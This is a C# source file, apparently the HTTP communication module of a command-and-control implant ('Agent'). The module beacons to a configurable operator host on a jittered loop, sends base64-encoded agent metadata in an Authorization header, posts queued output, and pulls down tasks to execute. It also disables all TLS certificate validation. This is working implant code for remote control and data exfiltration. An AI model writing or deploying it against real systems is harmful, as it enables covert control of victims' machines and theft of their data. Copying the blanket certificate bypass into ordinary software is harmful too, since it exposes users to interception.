using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }
        private CancellationTokenSource _tokenSource;
        private HttpClient _client;
        public HttpCommModule(string connectAddress,int connectPort)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        }
        public override void Init(AgentMetadata metadata)
        {
            base.Init(metadata);
            //ignore ssl
            var handler = new HttpClientHandler();
            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
            handler.ServerCertificateCustomValidationCallback = (httpRequestMessage, cert, cetChain, policyErrors) => {return true;};
            //
            _client = new HttpClient(handler);
            _client.BaseAddress = new System.Uri($"https://{ConnectAddress}:{ConnectPort}");
            _client.DefaultRequestHeaders.Clear();
            var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialize());
            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");

        }
        public override async Task Start(int jitterSeconds)
        {
            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {
                if (!Outbound.IsEmpty)
                {
                    await PostData();
                }
                else
                {
                    await Checkin();
                }
                await Task.Delay(jitterSeconds * 1000);
            }
        }

        private async Task Checkin()
        {
            var response = await _client.GetByteArrayAsync("/");
            HandleResponse(response);
        }

        private async Task PostData()
        {
            var outbound = GetOutbound().Serialize();
            var content = new StringContent(Encoding.UTF8.GetString(outbound),Encoding.UTF8,"application/json");
            var response = await _client.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();
            HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<AgentTask[]>();
            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    Inbound.Enqueue(task);
                }
            }
        }
        public override void Stop()
        {
            _tokenSource.Cancel();
        }
    }
}
